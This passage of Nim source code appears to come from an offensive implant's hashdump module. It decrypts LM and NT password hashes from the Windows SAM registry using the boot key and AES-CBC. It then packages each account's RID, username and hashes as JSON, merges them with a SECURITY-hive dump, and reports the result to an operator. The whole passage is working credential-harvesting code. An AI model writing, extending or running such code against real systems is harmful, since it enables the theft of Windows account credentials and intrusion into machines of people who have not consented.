            let lmHashSalt = enc_LM_Hash[8 ..< 24]
            let desEncryptedHash = DecryptAES_CBC(lmData, slice, lmHashSalt)
            if desEncryptedHash.len > 0:
              try:
                let lmHash = DecryptSingleHash(desEncryptedHash, userKey).replace("-", "").toLower()
                lmHashNode = %lmHash
                lmOk = true
              except CatchableError as e:
                debug "[-] hashdump: LM AES hash decrypt failed for ", userKey, ": ", e.msg
                discard
        requireRange(vValueUser, ntHashOffset, ntHashOffset + ntHashLength, "SAM V NT blob out of range")
        let enc_NT_Hash = vValueUser[ntHashOffset ..< ntHashOffset + ntHashLength]
        if enc_NT_Hash.len >= 24:
          let ntData = enc_NT_Hash[24 ..< enc_NT_Hash.len]
          if ntData.len > 0:
            attemptedDecrypt = true
            let slice = hashedBootKey[0 ..< 16]
            let ntHashSalt = enc_NT_Hash[8 ..< 24]
            let desEncryptedHash = DecryptAES_CBC(ntData, slice, ntHashSalt)
            if desEncryptedHash.len > 0:
              try:
                let ntHash = DecryptSingleHash(desEncryptedHash, userKey).replace("-", "").toLower()
                ntHashNode = %ntHash
                ntOk = true
              except CatchableError as e:
                debug "[-] hashdump: NT AES hash decrypt failed for ", userKey, ": ", e.msg
                discard
        if attemptedDecrypt:
          if lmOk or ntOk:
            decryptStatus = "ok"
          else:
            decryptStatus = "failed"

      let ridStr = $userRIDUint
      var userObj = %*{
        "rid": ridStr,
        "username": $usernameWstring,
        "decrypt_status": decryptStatus,
        "lm_hash": lmHashNode,
        "nt_hash": ntHashNode,
      }
      if lmOk and ntOk:
        userObj["ntlm"] = %($lmHashNode.getStr & ":" & ntHashNode.getStr)
      harvest.local_users.add(userObj)
    except HashdumpHarvestError as e:
      debug "[-] hashdump: skipping user ", userKey, ": ", e.debugDetail
      harvest.local_users.add(%*{
        "rid": userKey,
        "username": "",
        "decrypt_status": "failed",
        "lm_hash": newJNull(),
        "nt_hash": newJNull(),
      })
    except CatchableError as e:
      debug "[-] hashdump: skipping user ", userKey, ": ", e.msg

  return samWarning

proc collectSamDump(harvest: var HashdumpResult): PhaseResult =
  try:
    let implWarning = collectSamDumpImpl(harvest)
    var phase = PhaseResult(dataProduced: samDataProduced(harvest), failed: false)
    if implWarning.len > 0:
      phase.warning = implWarning
    return phase
  except HashdumpHarvestError as e:
    debug "[-] hashdump: ", e.debugDetail
    var warning = e.operatorMessage
    if warning.len == 0:
      warning = "SAM harvest failed"
    return PhaseResult(
      dataProduced: samDataProduced(harvest),
      failed: true,
      operatorMessage: e.operatorMessage,
      warning: warning
    )

proc collectHashdumpData*(): JsonNode =
  var harvestResult = initHashdumpResult()
  if not DynamicallyLoadFunctions():
    raise newHashdumpHarvestError("hashdump harvest failed", "failed to load required registry APIs")

  let samPhase = collectSamDump(harvestResult)
  let secPhase = collectSecurityDump(harvestResult)

  var warnings: seq[string] = @[]
  if samPhase.warning.len > 0:
    warnings.add(samPhase.warning)
  if secPhase.warning.len > 0:
    warnings.add(secPhase.warning)

  let samData = samPhase.dataProduced
  let secData = secPhase.dataProduced

  if not samData and not secData:
    var opMsg = "hashdump harvest failed"
    if samPhase.operatorMessage.len > 0 and samPhase.failed:
      opMsg = samPhase.operatorMessage
    elif secPhase.operatorMessage.len > 0 and secPhase.failed:
      opMsg = secPhase.operatorMessage
    raise newHashdumpHarvestError(opMsg, "hashdump harvest failed: no phase produced data")

  var status = "completed"
  if not (samData and secData and warnings.len == 0):
    status = "completed_with_errors"

  hashdumpResultToJson(harvestResult, status, warnings)
